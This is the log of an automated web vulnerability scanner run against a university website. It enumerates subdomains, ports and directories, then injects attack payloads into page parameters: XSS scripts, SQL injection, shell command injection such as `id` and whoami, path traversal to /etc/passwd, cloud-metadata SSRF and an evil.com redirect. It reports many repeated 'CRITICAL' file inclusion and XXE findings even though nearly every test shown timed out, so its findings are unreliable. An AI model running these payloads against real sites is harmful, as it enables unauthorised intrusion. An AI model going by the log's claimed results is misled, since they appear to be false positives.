[04:07:01] [INFO] Loaded 45 subdomains, 52 directories, 96 parameters
[04:07:01] [INFO] Initialized 9 attack patterns
[04:07:01] [INFO] ╔══════════════════════════════════════════════════════════════════╗
[04:07:01] [INFO] ║  🚀 VANGUARD SECURITY SCANNER v2.0 - ENTERPRISE EDITION           ║
[04:07:01] [INFO] ║  🔍 COMPREHENSIVE VULNERABILITY ASSESSMENT PLATFORM              ║
[04:07:01] [INFO] ║  ⚡ MAX CONCURRENT REQUESTS: 30                                ║
[04:07:01] [INFO] ║  🎯 CONFIDENCE THRESHOLD: 75%                                 ║
[04:07:01] [INFO] ╚══════════════════════════════════════════════════════════════════╝
[04:07:29] [INFO] ╔══════════════════════════════════════════════════════════════════╗
[04:07:29] [INFO] ║  🚀 VANGUARD SCAN INITIATED: https://le.ac.uk/                            ║
[04:07:29] [INFO] ║  📊 MAX CRAWL DEPTH: 10                                           ║
[04:07:29] [INFO] ║  ⚡ MAX CONCURRENT: 30                                          ║
[04:07:29] [INFO] ╚══════════════════════════════════════════════════════════════════╝
[04:07:29] [PHASE: Reconnaissance] Starting reconnaissance phase
[04:07:29] [INFO] Enumerating subdomains...
[04:07:34] [DEBUG] Found subdomain: shop.le.ac.uk (HTTP)
[04:07:35] [DEBUG] Found subdomain: shop.le.ac.uk (HTTPS)
[04:07:35] [DEBUG] Found subdomain: www.le.ac.uk (HTTP)
[04:07:35] [DEBUG] Found subdomain: www.le.ac.uk (HTTPS)
[04:07:37] [DEBUG] Found subdomain: webmail.le.ac.uk (HTTP)
[04:07:39] [DEBUG] Found subdomain: webmail.le.ac.uk (HTTPS)
[04:07:51] [INFO] Discovered 6 subdomains
[04:07:51] [INFO] Performing port scan...
[04:07:52] [DEBUG] Open port: le.ac.uk:80
[04:08:13] [DEBUG] Open port: le.ac.uk:443
[04:08:55] [INFO] Found 2 open ports
[04:08:55] [INFO] Detecting technologies...
[04:08:56] [INFO] Technologies detected: React, ASP.NET, Java, Vue.js, Angular
[04:08:56] [INFO] Brute forcing directories...
[04:08:58] [DEBUG] Found directory: https://le.ac.uk/media (OK)
[04:08:59] [DEBUG] Found directory: https://le.ac.uk/modules (OK)
[04:08:59] [DEBUG] Found directory: https://le.ac.uk/library (OK)
[04:08:59] [INFO] Discovered 3 directories
[04:08:59] [SUCCESS] Reconnaissance complete. Found 9 initial targets
[04:08:59] [PHASE: Discovery] Starting discovery phase
[04:09:00] [INFO] Discovered 0 API endpoints
[04:09:03] [DEBUG] Found sitemap: https://le.ac.uk/sitemap.xml
[04:09:05] [DEBUG] Found robots.txt: https://le.ac.uk/robots.txt
[04:09:08] [INFO] Discovered 0 common files
[04:10:13] [DEBUG] Found 73 parameters on https://www.le.ac.uk
[04:10:13] [DEBUG] Discovered parameter: admin on https://le.ac.uk/library
[04:10:13] [DEBUG] Found 79 parameters on https://le.ac.uk/library
[04:10:13] [SUCCESS] Parameter enumeration complete. Enumerated 14 pages
[04:10:13] [PHASE: VulnerabilityScanning] Starting vulnerability scanning
[04:10:29] [DEBUG] Test failed for contentUrl=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for cy=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for width=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for postalCode=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for username=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for cw=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for url=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for address=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for addressLocality=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:29] [DEBUG] Test failed for name=': The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:30] [DEBUG] Test failed for hash=`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:36] [DEBUG] Test failed for id=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:38] [DEBUG] Test failed for q=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:43] [DEBUG] Test failed for sameAs='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:45] [DEBUG] Test failed for address=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:45] [DEBUG] Test failed for cw=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:45] [DEBUG] Test failed for name=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:45] [DEBUG] Test failed for addressLocality=": The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:46] [DEBUG] Test failed for analytics_storage=http://127.0.0.1:22: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:53] [DEBUG] Test failed for datePublished='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:10:53] [DEBUG] Test failed for addressCountry=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:01] [DEBUG] Test failed for user=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:05] [DEBUG] Test failed for addressRegion=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:08] [DEBUG] Test failed for id=<img src=x onerror=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:09] [DEBUG] Test failed for name=' OR 1=1--: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:11] [DEBUG] Test failed for url=' OR 1=1--: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:19] [DEBUG] Test failed for sameAs=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:19] [DEBUG] Test failed for cx=2: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:22] [DEBUG] Test failed for dateModified=http://169.254.169.254/latest/meta-data/: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:22] [DEBUG] Test failed for contentUrl="><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:23] [DEBUG] Test failed for level=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:23] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
[04:11:23] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
[04:11:24] [DEBUG] Test failed for address=<svg onload=alert('XSS')>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:25] [DEBUG] Test failed for cw='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:26] [DEBUG] Test failed for addressRegion=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:28] [DEBUG] Test failed for hash=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:30] [DEBUG] Test failed for height=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:31] [DEBUG] Test failed for addressCountry=test: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:32] [DEBUG] Test failed for datePublished=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:33] [DEBUG] Test failed for name='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:34] [DEBUG] Test failed for sameAs=2: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:35] [DEBUG] Test failed for ad_user_data=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:38] [DEBUG] Test failed for ad_personalization=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:38] [DEBUG] Test failed for postalCode=100: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:39] [DEBUG] Test failed for level='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:40] [DEBUG] Test failed for width=http://127.0.0.1:22: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:41] [DEBUG] Test failed for addressRegion=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:42] [DEBUG] Test failed for address='><script>alert('XSS')</script>: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:44] [DEBUG] Test failed for description=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:45] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
[04:11:45] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
[04:11:47] [DEBUG] Test failed for analytics_storage=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:47] [DEBUG] Test failed for q=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:48] [DEBUG] Test failed for addressCountry=&& whoami: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:48] [DEBUG] Test failed for cx=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:49] [DEBUG] Test failed for id=http://localhost:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:53] [DEBUG] Test failed for postalCode=admin: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:55] [DEBUG] Test failed for width=http://[::1]:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:56] [DEBUG] Test failed for dateModified=test: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:57] [DEBUG] Test failed for contentUrl=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:11:57] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
[04:11:57] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
[04:11:57] [DEBUG] Test failed for item=; ls: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:00] [DEBUG] Test failed for hash=admin: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:02] [DEBUG] Test failed for url=http://[::1]:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:03] [DEBUG] Test failed for addressCountry=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:03] [DEBUG] Test failed for level=http://127.0.0.1:22: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:04] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'analytics_storage'
[04:12:04] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?analytics_storage=...
[04:12:05] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'streetAddress'
[04:12:05] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?streetAddress=...
[04:12:06] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
[04:12:06] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
[04:12:07] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'analytics_storage'
[04:12:07] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?analytics_storage=...
[04:12:08] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'analytics_storage'
[04:12:08] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?analytics_storage=...
[04:12:09] [DEBUG] Test failed for ch=../../../etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:09] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'user'
[04:12:09] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?user=...
[04:12:09] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'analytics_storage'
[04:12:09] [INFO] Found XML External Entity at https://www.le.ac.uk?analytics_storage=...
[04:12:10] [DEBUG] Test failed for height=/proc/self/environ: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:11] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'postalCode'
[04:12:11] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?postalCode=...
[04:12:11] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'height'
[04:12:11] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?height=...
[04:12:11] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'postalCode'
[04:12:11] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?postalCode=...
[04:12:12] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'height'
[04:12:12] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?height=...
[04:12:12] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'postalCode'
[04:12:12] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?postalCode=...
[04:12:13] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'width'
[04:12:13] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?width=...
[04:12:13] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'analytics_storage'
[04:12:13] [INFO] Found XML External Entity at https://www.le.ac.uk?analytics_storage=...
[04:12:14] [DEBUG] Test failed for item=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:14] [DEBUG] Test failed for datePublished=..\..\..\windows\win.ini: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:14] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'analytics_storage'
[04:12:14] [INFO] Found XML External Entity at https://www.le.ac.uk?analytics_storage=...
[04:12:15] [DEBUG] Test failed for addressLocality=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:15] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_storage'
[04:12:15] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_storage=...
[04:12:17] [DEBUG] Test failed for url=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:17] [DEBUG] Test failed for name=admin: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:18] [DEBUG] Test failed for cw=../../../etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:18] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'ad_user_data'
[04:12:18] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?ad_user_data=...
[04:12:18] [DEBUG] Test failed for addressCountry=$(whoami): The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:18] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'width'
[04:12:18] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?width=...
[04:12:19] [DEBUG] Test failed for level=http://[::1]:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:19] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cx'
[04:12:19] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cx=...
[04:12:19] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'user'
[04:12:19] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?user=...
[04:12:20] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cx'
[04:12:20] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cx=...
[04:12:20] [DEBUG] Test failed for streetAddress=....//....//....//etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:21] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'streetAddress'
[04:12:21] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?streetAddress=...
[04:12:21] [DEBUG] Test failed for hash=| dir: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:21] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'width'
[04:12:21] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?width=...
[04:12:21] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'datePublished'
[04:12:21] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?datePublished=...
[04:12:22] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'datePublished'
[04:12:22] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'id'
[04:12:22] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?id=...
[04:12:22] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?datePublished=...
[04:12:25] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'streetAddress'
[04:12:25] [INFO] Found XML External Entity at https://www.le.ac.uk?streetAddress=...
[04:12:25] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_storage'
[04:12:25] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_storage=...
[04:12:26] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressCountry'
[04:12:26] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressCountry=...
[04:12:27] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'id'
[04:12:27] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?id=...
[04:12:27] [DEBUG] Test failed for ad_personalization=../../../etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_storage'
[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_storage=...
[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressCountry'
[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressCountry=...
[04:12:27] [DEBUG] Test failed for height=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressLocality'
[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressLocality=...
[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressCountry'
[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressCountry=...
[04:12:28] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'id'
[04:12:28] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?id=...
[04:12:28] [DEBUG] Test failed for contentUrl=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:28] [DEBUG] Test failed for sameAs=/proc/self/environ: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:28] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressLocality'
[04:12:28] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressLocality=...
[04:12:28] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressLocality'
[04:12:28] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressLocality=...
[04:12:28] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'sameAs'
[04:12:29] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?sameAs=...
[04:12:29] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'ad_storage'
[04:12:29] [INFO] Found XML External Entity at https://www.le.ac.uk?ad_storage=...
[04:12:29] [DEBUG] Test failed for ch=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:29] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'sameAs'
[04:12:29] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?sameAs=...
[04:12:29] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'sameAs'
[04:12:29] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?sameAs=...
[04:12:30] [DEBUG] Test failed for analytics_storage=https://evil.com: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:30] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'ad_storage'
[04:12:30] [INFO] Found XML External Entity at https://www.le.ac.uk?ad_storage=...
[04:12:30] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ch'
[04:12:30] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ch=...
[04:12:31] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cy'
[04:12:31] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cy=...
[04:12:32] [DEBUG] Test failed for dateModified=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:33] [DEBUG] Test failed for postalCode=php://filter/convert.base64-encode/resource=index.php: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:33] [DEBUG] Test failed for url=100: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:33] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'width'
[04:12:33] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?width=...
[04:12:33] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'hash'
[04:12:33] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?hash=...
[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ch'
[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ch=...
[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'hash'
[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?hash=...
[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cy'
[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cy=...
[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cy'
[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cy=...
[04:12:35] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'dateModified'
[04:12:35] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?dateModified=...
[04:12:35] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'description'
[04:12:35] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?description=...
[04:12:35] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'dateModified'
[04:12:35] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?dateModified=...
[04:12:35] [DEBUG] Test failed for user=test: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:36] [DEBUG] Test failed for cx=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'description'
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'dateModified'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?dateModified=...
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?description=...
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_personalization'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_personalization=...
[04:12:36] [DEBUG] Test failed for cw=/proc/self/environ: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'description'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?description=...
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_personalization'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_personalization=...
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'item'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?item=...
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'width'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?width=...
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cw'
[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cw=...
[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'address'
[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?address=...
[04:12:37] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_personalization'
[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_personalization=...
[04:12:37] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cw'
[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cw=...
[04:12:37] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'width'
[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?width=...
[04:12:37] [DEBUG] Test failed for username=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
[04:12:37] [DEBUG] Test failed for datePublished=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
